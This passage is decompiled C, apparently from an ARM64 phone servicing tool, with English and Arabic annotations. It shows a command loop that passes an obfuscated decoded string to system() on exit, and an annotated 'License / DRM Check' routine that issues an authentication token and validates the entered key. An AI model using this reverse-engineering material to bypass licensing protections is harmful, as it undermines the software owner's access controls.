            pauVar28[-1][1] = bVar60 ^ (bVar60 ^ bVar60 ^ 0x20) & (byte)(uVar6 >> 0x10);
            pauVar28[-1][2] = bVar61 ^ (bVar61 ^ bVar61 ^ 0x20) & -(bVar61 - 0x61 < 0x1a);
            pauVar28[-1][3] = bVar62 ^ (bVar62 ^ bVar62 ^ 0x20) & -(bVar62 - 0x61 < 0x1a);
            pauVar28[-1][4] = bVar63 ^ (bVar63 ^ bVar63 ^ 0x20) & (byte)uVar5;
            pauVar28[-1][5] = bVar64 ^ (bVar64 ^ bVar64 ^ 0x20) & (byte)(uVar5 >> 0x20);
            pauVar28[-1][6] = bVar65 ^ (bVar65 ^ bVar65 ^ 0x20) & -(bVar65 - 0x61 < 0x1a);
            pauVar28[-1][7] = bVar66 ^ (bVar66 ^ bVar66 ^ 0x20) & -(bVar66 - 0x61 < 0x1a);
            *(long *)(*pauVar28 + 8) = auVar58._8_8_;
            *(long *)*pauVar28 = auVar58._0_8_;
            pauVar28 = pauVar28 + 2;
          } while (uVar40 != 0);
          if (uVar32 == uVar38) goto LAB_001a2c7c;
          if ((uVar32 & 0x18) == 0) {
            pbVar34 = pbVar23 + uVar38;
            goto LAB_001a2c4c;
          }
        }
        uVar40 = uVar32 & 0xfffffffffffffff8;
        pbVar34 = pbVar23 + uVar40;
        lVar25 = uVar38 - uVar40;
        puVar41 = (ulong *)(pbVar23 + uVar38);
        do {
          uVar38 = *puVar41;
          lVar25 = lVar25 + 8;
          bVar59 = (byte)(uVar38 >> 8);
          uVar5 = (uint6)CONCAT14(-((byte)(uVar38 >> 0x28) - 0x61 < 0x1a),
                                  -(uint)((byte)(uVar38 >> 0x20) - 0x61 < 0x1a)) & 0xffff0000ffff;
          *puVar41 = uVar38 ^ (uVar38 ^ uVar38 ^ 0x2020202020202020) &
                              CONCAT17(-((byte)(uVar38 >> 0x38) - 0x61 < 0x1a),
                                       CONCAT16(-((byte)(uVar38 >> 0x30) - 0x61 < 0x1a),
                                                CONCAT15((char)(uVar5 >> 0x20),
                                                         CONCAT14((char)uVar5,
                                                                  CONCAT13(-((byte)(uVar38 >> 0x18)
                                                                             - 0x61 < 0x1a),
                                                                           CONCAT12(-((byte)(uVar38 
                                                  >> 0x10) - 0x61 < 0x1a),
                                                  CONCAT11(-(bVar59 - 0x61 < 0x1a),
                                                           -((CONCAT12(bVar59,(ushort)(byte)uVar38)
                                                             & 0xffff) - 0x61 < 0x1a))))))));
          puVar41 = puVar41 + 1;
        } while (lVar25 != 0);
        if (uVar32 == uVar40) goto LAB_001a2c7c;
      }
LAB_001a2c4c:
      do {
        bVar60 = *pbVar34;
        bVar59 = bVar60 ^ 0x20;
        if (0x19 < bVar60 - 0x61) {
          bVar59 = bVar60;
        }
        pbVar39 = pbVar34 + 1;
        *pbVar34 = bVar59;
        pbVar34 = pbVar39;
      } while (pbVar39 != pbVar23 + uVar32);
    }
LAB_001a2c7c:
    pbVar23 = pbVar43;
    if ((local_150 & 1) != 0) {
      pbVar23 = local_140;
    }
    iVar22 = strcmp((char *)pbVar23,"EXIT");
    if (iVar22 == 0) {
      pbVar23 = (byte *)FUN_002295c4(&DAT_00234050);
      if ((*pbVar23 & 1) == 0) {
        puVar36 = (undefined8 *)FUN_002295c4(&DAT_00234030);
        *(undefined1 *)((long)puVar36 + 0x16) = 1;
        *(undefined4 *)(puVar36 + 2) = 0xf9c975b7;
        puVar36[1] = uVar7;
        *puVar36 = uVar24;
        *(undefined2 *)((long)puVar36 + 0x14) = 0xbfa2;
        FUN_002234c0(&LAB_001a900c,puVar36,0x2362d0);
        puVar29 = (undefined1 *)FUN_002295c4(&DAT_00234050);
        *puVar29 = 1;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00234030);
      FUN_001b5930();
      system(pcVar26);
      puts("RIL Exit");
      iVar44 = 1;
      iVar22 = 1;
    }
    else {
      FUN_002036bc(local_11f0,local_1190);
      FUN_002036bc(local_1208,&local_150);
      FUN_0019be20(&local_1178,local_11f0,local_1208);
      if ((local_150 & 1) == 0) {
        uStack_148 = (undefined6)sStack_1170;
        uStack_142 = (undefined2)(sStack_1170 >> 0x30);
        local_150 = (byte)local_1178;
        bStack_14f = (byte)(local_1178 >> 8);
        uStack_14e = (undefined4)(local_1178 >> 0x10);
        uStack_14a = (undefined2)(local_1178 >> 0x30);
      }
      else {
        free(local_140);
        uStack_148 = (undefined6)sStack_1170;
        uStack_142 = (undefined2)(sStack_1170 >> 0x30);
        local_150 = (byte)local_1178;
        bStack_14f = (byte)(local_1178 >> 8);
        uStack_14e = (undefined4)(local_1178 >> 0x10);
        uStack_14a = (undefined2)(local_1178 >> 0x30);
      }
      local_140 = local_1168;
      if ((local_1208[0] & 1) != 0) {
        free(local_11f8);
      }
      if ((local_11f0[0] & 1) != 0) {
        free(local_11e0);
      }
      FUN_002036bc(local_1220,&local_150);
      iVar22 = FUN_001b6e44(param_1,local_1220,&local_150);
      if ((local_1220[0] & 1) != 0) {
        free(local_1210);
      }
      if (iVar22 < 1) {
        local_1178 = 0;
        sStack_1170 = 0;
        local_1168 = (byte *)0x0;
        pvVar31 = (void *)(param_2 + 0x31);
        sVar27 = (ulong)(*(byte *)(param_2 + 0x30) >> 1);
        if ((*(byte *)(param_2 + 0x30) & 1) != 0) {
          pvVar31 = *(void **)(param_2 + 0x40);
          sVar27 = *(size_t *)(param_2 + 0x38);
        }
        if (0xffffffffffffffef < sVar27 + 1) goto LAB_001a33c0;
        if (sVar27 + 1 < 0x17) {
          local_1178 = (ulong)(byte)((int)sVar27 << 1);
          pbVar23 = (byte *)((ulong)&local_1178 | 1);
          if (sVar27 != 0) goto LAB_001a2e48;
        }
        else {
          uVar32 = sVar27 + 0x11 & 0xfffffffffffffff0;
          pbVar23 = (byte *)FUN_00202bc0(uVar32);
          local_1178 = uVar32 | 1;
          sStack_1170 = sVar27;
          local_1168 = pbVar23;
LAB_001a2e48:
          memcpy(pbVar23,pvVar31,sVar27);
        }
        pbVar23[sVar27] = 0;
        FUN_0020417c(&local_1178,&DAT_0013e485,1);
        uVar32 = (ulong)(local_150 >> 1);
        pbVar23 = pbVar43;
        if ((local_150 & 1) != 0) {
          uVar32 = CONCAT26(uStack_142,uStack_148);
          pbVar23 = local_140;
        }
        pbVar34 = (byte *)FUN_0020417c(&local_1178,pbVar23,uVar32);
        uVar35 = *(undefined8 *)(pbVar34 + 8);
        pbVar23 = *(byte **)(pbVar34 + 0x10);
        bVar59 = *pbVar34;
        bVar60 = pbVar34[1];
        uVar37 = *(undefined8 *)(pbVar34 + 2);
        pbVar34[8] = 0;
        pbVar34[9] = 0;
        pbVar34[10] = 0;
        pbVar34[0xb] = 0;
        pbVar34[0xc] = 0;
        pbVar34[0xd] = 0;
        pbVar34[0xe] = 0;
        pbVar34[0xf] = 0;
        pbVar34[0x10] = 0;
        pbVar34[0x11] = 0;
        pbVar34[0x12] = 0;
        pbVar34[0x13] = 0;
        pbVar34[0x14] = 0;
        pbVar34[0x15] = 0;
        pbVar34[0x16] = 0;
        pbVar34[0x17] = 0;
        pbVar34[0] = 0;
        pbVar34[1] = 0;
        pbVar34[2] = 0;
        pbVar34[3] = 0;
        pbVar34[4] = 0;
        pbVar34[5] = 0;
        pbVar34[6] = 0;
        pbVar34[7] = 0;
        local_1160._0_6_ = (undefined6)uVar37;
        local_1160._6_2_ = (undefined2)uVar35;
        uStack_1158 = (undefined6)((ulong)uVar35 >> 0x10);
        if ((local_150 & 1) != 0) {
          free(local_140);
        }
        *puVar33 = CONCAT26(local_1160._6_2_,(undefined6)local_1160);
        *(ulong *)((long)puVar33 + 6) = CONCAT62(uStack_1158,local_1160._6_2_);
        local_150 = bVar59;
        bStack_14f = bVar60;
        local_140 = pbVar23;
        if ((local_1178 & 1) != 0) {
          free(local_1168);
        }
        uVar35 = FUN_00202bc0(8);
        FUN_0020c7ac();
        puVar36 = (undefined8 *)FUN_00202bc0(0x28);
        FUN_002036bc(&local_1178,&local_150);
        *puVar36 = uVar35;
        puVar36[1] = &LAB_001a741c;
        puVar36[3] = sStack_1170;
        puVar36[2] = local_1178;
        puVar36[4] = local_1168;
        iVar22 = pthread_create(&local_1160,(pthread_attr_t *)0x0,FUN_001b5e04,puVar36);
        if (iVar22 != 0) {
                    /* WARNING: Subroutine does not return */
          FUN_0020c118(iVar22,"thread constructor failed");
        }
        local_1178 = 200000000;
        FUN_0020c368(&local_1178);
        FUN_0020c2f4(&local_1160);
        FUN_0020c284(&local_1160);
        iVar44 = 0;
        iVar22 = 0;
      }
      else {
        pbVar23 = pbVar43;
        if ((local_150 & 1) != 0) {
          pbVar23 = local_140;
        }
        printf("\n\nError: %s",pbVar23);
        iVar44 = 8;
        iVar22 = 8;
      }
    }
    if ((local_150 & 1) != 0) {
      free(local_140);
      iVar22 = iVar44;
    }
    puVar41 = local_11a8;
    if ((iVar22 != 8) && (iVar22 != 0)) {
      puVar42 = local_11a0;
      if (local_11a8 != (ulong *)0x0) {
        while (puVar19 = puVar42, puVar19 != puVar41) {
          puVar42 = puVar19 + -3;
          if ((*puVar42 & 1) != 0) {
            free((void *)puVar19[-1]);
          }
        }
        local_11a0 = puVar41;
        free(local_11a8);
      }
      if ((local_1190[0] & 1) != 0) {
        free(local_1180);
      }
      if (*(long *)(lVar4 + 0x28) != local_78) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
  } while( true );
LAB_001a2678:
  FUN_00204f8c(pbVar43,puVar41);
  goto LAB_001a27a0;
}



// ----------------------------------------------------------------




// ============================================================================
// MODULE 7: Original License / DRM Check (Reference Only) (حماية التراخيص الأصلية)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_001b89b0
 * Purpose (EN): AuthKey Token Validation & Challenge-Response
 * Purpose (AR): نظام فحص الرمز وتأكيد المفتاح الأصلي للأداة
 */

// Function: FUN_001b89b0 @ 001b89b0
// ----------------------------------------------------------------

/* WARNING: Type propagation algorithm not settling */

void FUN_001b89b0(ulong *param_1,long param_2)

{
  char *pcVar1;
  ulong *puVar2;
  long *plVar3;
  void *pvVar4;
  byte *pbVar5;
  byte bVar6;
  long lVar7;
  uint6 uVar8;
  uint3 uVar9;
  uint6 uVar10;
  uint3 uVar11;
  uint6 uVar12;
  uint3 uVar13;
  uint6 uVar14;
  uint3 uVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar26;
  byte bVar27;
  byte bVar28;
  byte bVar29;
  byte bVar30;
  byte bVar31;
  byte bVar32;
  byte bVar33;
  byte bVar34;
  byte bVar35;
  byte bVar36;
  byte bVar37;
  byte bVar38;
  byte bVar39;
  byte bVar40;
  byte bVar41;
  byte bVar42;
  byte bVar43;
  byte bVar44;
  byte bVar45;
  ulong uVar46;
  ulong *puVar47;
  undefined8 uVar48;
  long *plVar49;
  char *pcVar50;
  char *pcVar51;
  char *pcVar52;
  char *pcVar53;
  size_t sVar54;
  int iVar55;
  ulong uVar56;
  size_t sVar57;
  void *pvVar58;
  ulong uVar59;
  long lVar60;
  byte *pbVar61;
  byte *pbVar62;
  ulong *puVar63;
  byte bVar64;
  byte local_13f8 [16];
  void *local_13e8;
  byte local_13e0 [16];
  void *local_13d0;
  byte local_13c8 [16];
  void *local_13b8;
  byte local_13b0 [16];
  void *local_13a0;
  byte local_1398 [16];
  void *local_1388;
  byte local_1380 [16];
  void *local_1370;
  byte local_1368 [16];
  void *local_1358;
  byte local_1350 [16];
  void *local_1340;
  byte local_1338 [16];
  void *local_1328;
  byte local_1320 [16];
  void *local_1310;
  byte local_1308 [16];
  void *local_12f8;
  byte local_12f0 [16];
  void *local_12e0;
  byte local_12d8 [16];
  void *local_12c8;
  byte local_12c0 [16];
  void *local_12b0;
  ushort local_12a8;
  undefined1 local_12a6;
  void *local_1298;
  byte local_1290 [16];
  void *local_1280;
  byte local_1278 [16];
  void *local_1268;
  byte local_1260 [16];
  void *local_1250;
  ulong local_1248;
  size_t local_1240;
  void *local_1238;
  ulong local_1230;
  ulong uStack_1228;
  void *local_1220;
  ulong local_1210;
  ulong uStack_1208;
  void *local_1200;
  ulong local_11f0;
  ulong uStack_11e8;
  void *local_11e0;
  ulong local_11d0;
  ulong uStack_11c8;
  void *local_11c0;
  ulong local_11b0;
  ulong uStack_11a8;
  void *local_11a0;
  ulong local_1190;
  ulong uStack_1188;
  void *local_1180;
  ulong local_1170;
  ulong uStack_1168;
  void *local_1160;
  ulong local_1150;
  ulong uStack_1148;
  void *local_1140;
  ulong local_1130;
  ulong uStack_1128;
  void *local_1120;
  ulong local_1110;
  ulong uStack_1108;
  void *local_1100;
  ulong local_10f0;
  ulong uStack_10e8;
  void *local_10e0;
  ulong local_10d0;
  ulong uStack_10c8;
  void *local_10c0;
  ulong local_10b0;
  ulong uStack_10a8;
  void *local_10a0;
  ulong local_1090;
  ulong uStack_1088;
  void *local_1080;
  ulong local_1070;
  ulong uStack_1068;
  void *local_1060;
  long local_68;
  
  lVar7 = tpidr_el0;
  local_68 = *(long *)(lVar7 + 0x28);
  bVar64 = *(byte *)(param_2 + 600);
  param_1[0xe] = 0;
  sVar57 = *(size_t *)(param_2 + 0x260);
  param_1[0xb] = 0;
  param_1[10] = 0;
  param_1[0xd] = 0;
  param_1[0xc] = 0;
  pvVar58 = *(void **)(param_2 + 0x268);
  param_1[7] = 0;
  param_1[6] = 0;
  param_1[9] = 0;
  param_1[8] = 0;
  pvVar4 = (void *)(param_2 + 0x259);
  sVar54 = (ulong)(bVar64 >> 1);
  if ((bVar64 & 1) != 0) {
    pvVar4 = pvVar58;
    sVar54 = sVar57;
  }
  param_1[3] = 0;
  param_1[2] = 0;
  param_1[5] = 0;
  param_1[4] = 0;
  param_1[1] = 0;
  *param_1 = 0;
  local_1248 = 0;
  local_1240 = 0;
  local_1238 = (void *)0x0;
  if (0xffffffffffffffef < sVar54 + 1) {
                    /* WARNING: Subroutine does not return */
    FUN_00203188(&local_1248);
  }
  if (sVar54 + 1 < 0x17) {
    pvVar58 = (void *)((ulong)&local_1248 | 1);
    local_1248 = (ulong)(byte)((int)sVar54 << 1);
    if (sVar54 == 0) goto LAB_001b8a88;
  }
  else {
    uVar56 = sVar54 + 0x11 & 0xfffffffffffffff0;
    pvVar58 = (void *)FUN_00202bc0(uVar56);
    local_1248 = uVar56 | 1;
    local_1240 = sVar54;
    local_1238 = pvVar58;
  }
  memcpy(pvVar58,pvVar4,sVar54);
LAB_001b8a88:
  *(undefined1 *)((long)pvVar58 + sVar54) = 0;
  FUN_0020417c(&local_1248,&DAT_0013edca,1);
  uVar56 = (ulong)(*(byte *)(param_2 + 0x270) >> 1);
  lVar60 = param_2 + 0x271;
  if ((*(byte *)(param_2 + 0x270) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x278);
    lVar60 = *(long *)(param_2 + 0x280);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_1248,lVar60,uVar56);
  uStack_1228 = puVar47[1];
  local_1230 = *puVar47;
  local_1220 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_1230,&DAT_0013edca);
  uStack_1208 = puVar47[1];
  local_1210 = *puVar47;
  local_1200 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x288) >> 1);
  lVar60 = param_2 + 0x289;
  if ((*(byte *)(param_2 + 0x288) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x290);
    lVar60 = *(long *)(param_2 + 0x298);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_1210,lVar60,uVar56);
  uStack_11e8 = puVar47[1];
  local_11f0 = *puVar47;
  local_11e0 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_11f0,&DAT_0013edca);
  uStack_11c8 = puVar47[1];
  local_11d0 = *puVar47;
  local_11c0 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x2a0) >> 1);
  lVar60 = param_2 + 0x2a1;
  if ((*(byte *)(param_2 + 0x2a0) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x2a8);
    lVar60 = *(long *)(param_2 + 0x2b0);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_11d0,lVar60,uVar56);
  uStack_11a8 = puVar47[1];
  local_11b0 = *puVar47;
  local_11a0 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_11b0,&DAT_0013edca);
  uStack_1188 = puVar47[1];
  local_1190 = *puVar47;
  local_1180 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x2b8) >> 1);
  lVar60 = param_2 + 0x2b9;
  if ((*(byte *)(param_2 + 0x2b8) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x2c0);
    lVar60 = *(long *)(param_2 + 0x2c8);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_1190,lVar60,uVar56);
  uStack_1168 = puVar47[1];
  local_1170 = *puVar47;
  local_1160 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_1170,&DAT_0013edca);
  uStack_1148 = puVar47[1];
  local_1150 = *puVar47;
  local_1140 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x300) >> 1);
  lVar60 = param_2 + 0x301;
  if ((*(byte *)(param_2 + 0x300) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x308);
    lVar60 = *(long *)(param_2 + 0x310);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_1150,lVar60,uVar56);
  uStack_1128 = puVar47[1];
  local_1130 = *puVar47;
  local_1120 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_1130,&DAT_0013edca);
  uStack_1108 = puVar47[1];
  local_1110 = *puVar47;
  local_1100 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x318) >> 1);
  lVar60 = param_2 + 0x319;
  if ((*(byte *)(param_2 + 0x318) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 800);
    lVar60 = *(long *)(param_2 + 0x328);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_1110,lVar60,uVar56);
  uStack_10e8 = puVar47[1];
  local_10f0 = *puVar47;
  local_10e0 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_10f0,&DAT_0013edca);
  uStack_10c8 = puVar47[1];
  local_10d0 = *puVar47;
  local_10c0 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x2e8) >> 1);
  lVar60 = param_2 + 0x2e9;
  if ((*(byte *)(param_2 + 0x2e8) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x2f0);
    lVar60 = *(long *)(param_2 + 0x2f8);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_10d0,lVar60,uVar56);
  uStack_10a8 = puVar47[1];
  local_10b0 = *puVar47;
  local_10a0 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  puVar47 = (ulong *)FUN_00205098(&local_10b0,&DAT_0013edca);
  uStack_1068 = puVar47[1];
  local_1070 = *puVar47;
  local_1060 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  uVar56 = (ulong)(*(byte *)(param_2 + 0x378) >> 1);
  pbVar5 = (byte *)(param_2 + 0x379);
  if ((*(byte *)(param_2 + 0x378) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x380);
    pbVar5 = *(byte **)(param_2 + 0x388);
  }
  puVar47 = (ulong *)FUN_0020417c(&local_1070,pbVar5,uVar56);
  uStack_1088 = puVar47[1];
  local_1090 = *puVar47;
  local_1080 = (void *)puVar47[2];
  puVar47[1] = 0;
  puVar47[2] = 0;
  *puVar47 = 0;
  if ((local_1070 & 1) != 0) {
    free(local_1060);
  }
  if ((local_10b0 & 1) != 0) {
    free(local_10a0);
  }
  if ((local_10d0 & 1) != 0) {
    free(local_10c0);
  }
  if ((local_10f0 & 1) != 0) {
    free(local_10e0);
  }
  if ((local_1110 & 1) != 0) {
    free(local_1100);
  }
  if ((local_1130 & 1) != 0) {
    free(local_1120);
  }
  if ((local_1150 & 1) != 0) {
    free(local_1140);
  }
  if ((local_1170 & 1) != 0) {
    free(local_1160);
  }
  if ((local_1190 & 1) != 0) {
    free(local_1180);
  }
  if ((local_11b0 & 1) != 0) {
    free(local_11a0);
  }
  if ((local_11d0 & 1) != 0) {
    free(local_11c0);
  }
  if ((local_11f0 & 1) != 0) {
    free(local_11e0);
  }
  if ((local_1210 & 1) != 0) {
    free(local_1200);
  }
  if ((local_1230 & 1) != 0) {
    free(local_1220);
  }
  if ((local_1248 & 1) != 0) {
    free(local_1238);
  }
  uVar48 = FUN_002036bc(local_1260,&local_1090);
  FUN_001b8634(uVar48,local_1260,&local_1090,0);
  if ((local_1260[0] & 1) != 0) {
    free(local_1250);
  }
  lVar60 = param_2 + 8;
  FUN_002036bc(local_1278,&local_1090);
  FUN_001ba254(&local_1070,lVar60,local_1278);
  if ((local_1090 & 1) != 0) {
    free(local_1080);
  }
  local_1090 = local_1070;
  local_1070 = local_1070 & 0xffffffffffff0000;
  uStack_1088 = uStack_1068;
  local_1080 = local_1060;
  if ((local_1278[0] & 1) != 0) {
    free(local_1268);
  }
  FUN_002036bc(local_1290,&local_1090);
  local_12a6 = 0;
  local_12a8 = 0x3302;
  FUN_001bbdfc(&local_1070,lVar60,local_1290,&local_12a8);
  if ((local_1090 & 1) != 0) {
    free(local_1080);
  }
  local_1090 = local_1070;
  local_1070 = local_1070 & 0xffffffffffff0000;
  uStack_1088 = uStack_1068;
  local_1080 = local_1060;
  if ((local_12a8 & 1) != 0) {
    free(local_1298);
  }
  if ((local_1290[0] & 1) != 0) {
    free(local_1280);
  }
  FUN_002036bc(local_12c0,&local_1090);
  FUN_001bac64(&local_1070,lVar60,local_12c0);
  if ((local_1090 & 1) != 0) {
    free(local_1080);
  }
  local_1090 = local_1070;
  local_1070 = local_1070 & 0xffffffffffff0000;
  uStack_1088 = uStack_1068;
  local_1080 = local_1060;
  if ((local_12c0[0] & 1) != 0) {
    free(local_12b0);
  }
  FUN_00207348(&local_1070,"01000101",&local_1090);
  if ((local_1090 & 1) != 0) {
    free(local_1080);
  }
  local_1090 = local_1070;
  uStack_1088 = uStack_1068;
  local_1080 = local_1060;
  uVar56 = local_1070 >> 1 & 0x7f;
  if ((local_1070 & 1) != 0) {
    uVar56 = uStack_1068;
  }
  while (local_1070 = local_1090, uStack_1068 = uStack_1088, local_1060 = local_1080, uVar56 < 0x1f9
        ) {
    FUN_00207348(&local_1070,&DAT_0013eea9,&local_1090);
    if ((local_1090 & 1) != 0) {
      free(local_1080);
    }
    local_1090 = local_1070;
    uStack_1088 = uStack_1068;
    local_1080 = local_1060;
    uVar56 = local_1070 >> 1 & 0x7f;
    if ((local_1070 & 1) != 0) {
      uVar56 = uStack_1068;
    }
  }
  FUN_00207348(&local_1070,&DAT_0013d4d9,&local_1090);
  if ((local_1090 & 1) != 0) {
    free(local_1080);
  }
  uStack_1088 = uStack_1068;
  local_1090 = local_1070;
  local_1080 = local_1060;
  FUN_001ba434(lVar60,&local_1090);
  pvVar4 = (void *)((ulong)&local_1090 | 1);
  if ((local_1090 & 1) != 0) {
    pvVar4 = local_1080;
  }
  printf("\n\n [+] Authantication Token : %s",pvVar4);
  printf("\n\n [+] Enter Authantication Key : ");
  scanf("%s",&local_1070);
  puVar47 = (ulong *)(param_2 + 0x390);
  FUN_00204d38(puVar47,&local_1070);
  FUN_001baf80(lVar60,puVar47);
  pcVar1 = (char *)(param_2 + 0x391);
  uVar56 = (ulong)(*(byte *)(param_2 + 0x390) >> 1);
  pcVar52 = pcVar1;
  if ((*(byte *)(param_2 + 0x390) & 1) != 0) {
    uVar56 = *(ulong *)(param_2 + 0x398);
    pcVar52 = *(char **)(param_2 + 0x3a0);
  }
  if (7 < (long)uVar56) {
    puVar2 = (ulong *)(param_2 + 0x378);
    plVar3 = (long *)(pcVar52 + uVar56);
    pcVar50 = pcVar52;
    do {
      plVar49 = memchr(pcVar50,0x30,uVar56 - 7);
      if (plVar49 == (long *)0x0) break;
      if (*plVar49 == 0x3130313030303130) {
        iVar55 = (int)plVar49 - (int)pcVar52;
        if (plVar49 == plVar3) {
          iVar55 = -1;
        }
        if (0 < iVar55) {
          uVar48 = FUN_002043ac(local_12d8,puVar47,2,8,puVar47);
          FUN_001b80e4(&local_10b0,uVar48,local_12d8);
          if ((param_1[0xc] & 1) != 0) {
            free((void *)param_1[0xe]);
          }
          uVar56 = local_10b0;
          local_10b0 = local_10b0 & 0xffffffffffff0000;
          param_1[0xd] = uStack_10a8;
          param_1[0xc] = uVar56;
          param_1[0xe] = (ulong)local_10a0;
          if ((local_12d8[0] & 1) != 0) {
            free(local_12c8);
          }
          FUN_002043ac(&local_10b0,puVar47,(long)(iVar55 + 8),0xffffffffffffffff,puVar47);
          if ((*(byte *)puVar47 & 1) != 0) {
            free(*(void **)(param_2 + 0x3a0));
          }
          *(ulong *)(param_2 + 0x398) = uStack_10a8;
          *puVar47 = local_10b0;
          *(void **)(param_2 + 0x3a0) = local_10a0;
          uVar48 = FUN_002036bc(local_12f0,param_2 + 0x330);
          FUN_001b80e4(&local_10b0,uVar48,local_12f0);
          puVar63 = (ulong *)(param_2 + 0x348);
          if ((*(byte *)(param_2 + 0x348) & 1) != 0) {
            free(*(void **)(param_2 + 0x358));
          }
          uVar56 = local_10b0;
          local_10b0 = local_10b0 & 0xffffffffffff0000;
          *(ulong *)(param_2 + 0x350) = uStack_10a8;
          *puVar63 = uVar56;
          *(void **)(param_2 + 0x358) = local_10a0;
          if ((local_12f0[0] & 1) != 0) {
            free(local_12e0);
          }
          FUN_002036bc(local_1308,puVar63);
          FUN_001ba254(&local_10b0,lVar60,local_1308);
          if ((*(byte *)puVar63 & 1) != 0) {
            free(*(void **)(param_2 + 0x358));
          }
          uVar56 = local_10b0;
          local_10b0 = local_10b0 & 0xffffffffffff0000;
          *(ulong *)(param_2 + 0x350) = uStack_10a8;
          *puVar63 = uVar56;
          *(void **)(param_2 + 0x358) = local_10a0;
          if ((local_1308[0] & 1) != 0) {
            free(local_12f8);
          }
          FUN_002036bc(local_1320,param_2 + 0x360);
          FUN_001ba254(&local_10b0,lVar60,local_1320);
          if ((local_1320[0] & 1) != 0) {
            free(local_1310);
          }
          FUN_002036bc(local_1338,&local_10b0);
          FUN_002036bc(local_1350,puVar63);
          FUN_001bb2ac(&local_10d0,lVar60,local_1338,local_1350);
          if ((*(byte *)puVar2 & 1) != 0) {
            free(*(void **)(param_2 + 0x388));
          }
          uVar56 = local_10d0;
          local_10d0 = local_10d0 & 0xffffffffffff0000;
          *(ulong *)(param_2 + 0x380) = uStack_10c8;
          *puVar2 = uVar56;
          *(void **)(param_2 + 0x388) = local_10c0;
          if ((local_1350[0] & 1) != 0) {
            free(local_1340);
          }
          if ((local_1338[0] & 1) != 0) {
            free(local_1328);
          }
          uVar56 = (ulong)(*(byte *)(param_2 + 0x378) >> 1);
          if ((*(byte *)(param_2 + 0x378) & 1) != 0) {
            uVar56 = *(ulong *)(param_2 + 0x380);
          }
          if (uVar56 < 5) {
            FUN_002036bc(local_1368,puVar63);
            FUN_002036bc(local_1380,&local_10b0);
            FUN_001bb2ac(&local_10d0,lVar60,local_1368,local_1380);
            if ((*(byte *)puVar2 & 1) != 0) {
              free(*(void **)(param_2 + 0x388));
            }
            uVar56 = local_10d0;
            local_10d0 = local_10d0 & 0xffffffffffff0000;
            *(ulong *)(param_2 + 0x380) = uStack_10c8;
            *puVar2 = uVar56;
            *(void **)(param_2 + 0x388) = local_10c0;
            if ((local_1380[0] & 1) != 0) {
              free(local_1370);
            }
            if ((local_1368[0] & 1) != 0) {
              free(local_1358);
            }
          }
          FUN_002036bc(local_1398,puVar2);
          FUN_001bac64(&local_10d0,lVar60,local_1398);
          if ((*(byte *)puVar2 & 1) != 0) {
            free(*(void **)(param_2 + 0x388));
          }
          uVar56 = local_10d0;
          local_10d0 = local_10d0 & 0xffffffffffff0000;
          *(ulong *)(param_2 + 0x380) = uStack_10c8;
          *puVar2 = uVar56;
          *(void **)(param_2 + 0x388) = local_10c0;
          if ((local_1398[0] & 1) != 0) {
            free(local_1388);
          }
          bVar64 = *(byte *)(param_2 + 0x378);
          uVar59 = *(ulong *)(param_2 + 0x380);
          uVar56 = (ulong)(bVar64 >> 1);
          pbVar5 = (byte *)(param_2 + 0x379);
          uVar46 = uVar56;
          if ((bVar64 & 1) != 0) {
            pbVar5 = *(byte **)(param_2 + 0x388);
            uVar46 = uVar59;
          }
          if (uVar46 == 0) goto LAB_001b9658;
          pbVar61 = pbVar5;
